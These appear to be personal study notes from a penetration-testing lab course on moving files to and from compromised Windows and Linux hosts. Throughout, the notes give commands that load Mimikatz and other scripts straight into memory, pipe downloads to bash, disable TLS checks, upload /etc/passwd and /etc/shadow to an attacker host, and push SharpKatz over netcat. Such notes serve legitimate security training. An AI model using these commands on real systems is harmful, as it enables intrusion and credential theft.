# <mark class="hltr-pink">Windows file transfers methods</mark>

## <mark class="hltr-cyan">PowerShell Base64 Encode & Decode</mark>

Depending on the file size we want to transfer, we can use different methods that do not require network communication.

If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content. Let's see how we can do this with PowerShell.

- Encoding the file on the linux vm
```
cat id_rsa |base64 -w 0;echo
```

- Decoding the file on the windows target
```powershell-session
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<THE B64 STRING>"))
```

Finally, we can confirm if the file was transferred successfully by comparing MD5 checksums.

- Linux
```
md5sum id_rsa
```

- Windows
```powershell-session
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

<mark class="hltr-red">Note:</mark> While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.

## <mark class="hltr-cyan">PowerShell Web Downloads</mark>
### <mark class="hltr-orange">PowerShell DownloadFile Method</mark>
In any version of PowerShell, the System.Net.WebClientclass can be used to download a file over `HTTP`, `HTTPS` or `FTP`.

![[Pasted image 20240804172048.png]]

```powershell-session
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

- Async
```powershell-session
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

### <mark class="hltr-orange">PowerShell DownloadString - Fileless Method</mark>

fileless attacks work by using some operating system functions to download the payload and execute it directly (<mark class="hltr-red">In memory</mark>)

```powershell-session
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

### <mark class="hltr-orange">Common errors with powershell</mark>
#### <mark class="hltr-grey">Internet Explorer</mark>
There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.
![[Pasted image 20240804173247.png]]
This can be bypassed using the parameter `-UseBasicParsing`.

```powershell-session
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

#### <mark class="hltr-grey">SSL/TLS</mark>
Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

```powershell-session
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

#### <mark class="hltr-grey">Powershell Download cradles</mark>

Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239).

## <mark class="hltr-cyan">SMB Downloads</mark>
### <mark class="hltr-orange">Unauthenticated</mark>

First we have to create an smb server on the linux host

```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

then we can access the share 

```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe
```

### <mark class="hltr-orange">Authenticated</mark>

New versions of Windows block unauthenticated guest access, as we can see in the following command:

```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

we can set a username and password using our Impacket SMB server:

```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

and mount the SMB server on our windows target machine:
```cmd-session
C:\htb> net use n: \\192.168.220.133\share /user:test test
C:\htb> copy n:\nc.exe
```

<mark class="hltr-red">Note:</mark> You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.

## <mark class="hltr-cyan">FTP Downloads</mark>

Creating the ftp server
```shell-session
sudo python3 -m pyftpdlib --port 21
```

Now we can download the remote file on the windows target
```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

## <mark class="hltr-cyan">Upload Operations</mark>
### <mark class="hltr-orange">PowerShell Base64 Encode & Decode</mark>

- Encoding
```powershell-session
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "<path>" -Encoding byte))
```

- Decoding
```shell-session
echo "<base64>" | base64 -d > hosts
```

We can then compare the md5 checksums

### <mark class="hltr-orange">Powershell Web Uploads</mark>

We have to start the upload server first on the attacker machine

```
uploadserver
```

Now we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.

```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

### <mark class="hltr-orange">Powershell Base64 Web Uploads</mark>

We run a listener
```shell-session
nc -lvnp 8000
```

Then we send the file over the network
```powershell-session
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path '<path>' -Encoding Byte))

PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

Then we decode the string

### <mark class="hltr-orange">FTP Uploads</mark>


```shell-session
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell-session
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

<mark class="hltr-grey">Create a Command File for the FTP Client to Upload a File</mark>

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

---
# <mark class="hltr-pink">Linux File Transfer Methods</mark>

## <mark class="hltr-cyan">Base64 Encoding / Decoding</mark>

- encoding
```shell-session
cat id_rsa |base64 -w 0;echo
```

- decoding
```shell-session
echo -n"<b64>" | base64 -d 
```

Then we can compare md5 checksums to verify if the successfulness of the transfer

## <mark class="hltr-cyan">Web Downloads</mark>

- wget
```shell-session
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

- curl
```shell-session
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## <mark class="hltr-cyan">Fileless Attacks</mark>

Fileless attacks use pipes in linux

- bash
Here we pipe a script file to bash
```shell-session
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

- python
Here we pipe a script file to python
```shell-session
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

## <mark class="hltr-cyan">Download with Bash (/dev/tcp)</mark>

There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

1) First we have to connect to the target webserver
```shell-session
exec 3<>/dev/tcp/10.10.10.32/80
```

2) Then we send a GET request
```shell-session
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

3) And finally we print the response
```shell-session
cat <&3
```

## <mark class="hltr-cyan">SSH Downloads (scp)</mark>

(attacker -> target)

Before we begin downloading files from our target Linux machine to our Pwnbox, let's set up an SSH server in our Pwnbox.

```
sudo systemctl start ssh
```

```shell-session
scp test.txt userbravo@destination:/location2
```

## <mark class="hltr-cyan">Upload Operations</mark>

(target -> attacker)
### <mark class="hltr-orange">Web Upload</mark>

Step 1: Create a new directoy
```
mkdir https && cd $_
```

Step 2: Create a self signed certificate
```shell-session
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

Step 3: Start the web server

```shell-session
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Step 4: Finally we upload the files to the attacker machine
```shell-session
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### <mark class="hltr-orange">Alternative Web File Transfer Method</mark>

We have to start an http server on the target machine

- python3
```
python3 -m http.server
```

- python2.7
```
python2.7 -m SimpleHTTPServer
```

- php
```
php -S localhost:8000
```

- ruby
```
ruby -run -ehttpd . -p8000
```

Then we can simply request the file from the server
```
wget 192.168.49.128:8000/filetotransfer.txt
```

### <mark class="hltr-orange">SCP Upload</mark>

If outbound ssh connections (TCP 22) are allowed, we can use scp (secure copy) to upload a file to our linux attacker machine

```shell-session
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

---
# <mark class="hltr-pink">Transferring Files with Code</mark>

- Python 2 - Download
```shell-session
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

- Python3 - Download
```shell-session
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

- php download with file_get_contents
```shell-session
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

- php download with fopen
```shell-session
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

- php download a file and pipe it to bash
```shell-session
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

- ruby download
```shell-session
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

- perl download
```shell-session
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

- Javascript
We can download a file using this code:
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

We'll save this as a file called <mark class="hltr-green">wget.js</mark> and then use it to download files:

```cmd-session
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

- VBS
wget.vbs:
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

cmd:
```cmd-session
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

## <mark class="hltr-cyan">Uploads</mark>

first we have to start the web server
```
uploadserver
```

Then we use this python one-liner to do the upload using a POST request
```shell-session
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

---
# <mark class="hltr-pink">Miscellaneous File Transfer Methods</mark>

## <mark class="hltr-cyan">Netcat  - Compromised Machine - Listening on Port 8000</mark>

```shell-session
nc -l -p 8000 > SharpKatz.exe
```

## <mark class="hltr-cyan">ncat  - Compromised Machine - Listening on Port 8000</mark>

```shell-session
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

## <mark class="hltr-cyan">Netcat - Attack Host - Sending File to Compromised machine</mark>

```shell-session
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

## <mark class="hltr-cyan">Ncat - Attack Host - Sending File to Compromised machine</mark>

```shell-session
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```


## <mark class="hltr-cyan">Attack Host - Sending File as Input to Netcat</mark>

Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat.

```shell-session
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

## <mark class="hltr-cyan">Compromised Machine Connect to Netcat to Receive the File</mark>

```shell-session
nc 192.168.49.128 443 > SharpKatz.exe
```

## <mark class="hltr-cyan">Attack Host - Sending File as Input to Ncat</mark>

```shell-session
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

## <mark class="hltr-cyan">Compromised Machine Connect to Ncat to Receive the File</mark>

```shell-session
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

## <mark class="hltr-cyan">NetCat - Sending File as Input to Netcat</mark>

```shell-session
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

## <mark class="hltr-cyan">Ncat - Sending File as Input to Netcat</mark>

```shell-session
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

## <mark class="hltr-cyan">Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File</mark>

```shell-session
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

## <mark class="hltr-cyan">PowerShell Session File Transfer</mark>

there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations.

PowerShell Remoting allows us to execute scripts or commands on a remote computer using PowerShell sessions.
By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session configuration.

```powershell-session
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

Because this session already has privileges over `DATABASE01`, we don't need to specify credentials. In the example below, a session is created to the remote computer named `DATABASE01` and stores the results in the variable named `$Session`.

```powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Create a PowerShell Remoting Session to DATABASE01
```powershell-session
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

We can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` to the `DATABASE01` session we have `$Session` or vice versa.

- Copy samplefile.txt from our Localhost to the DATABASE01 Session
```powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

- Copy DATABASE.txt from DATABASE01 Session to our Localhost
```powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

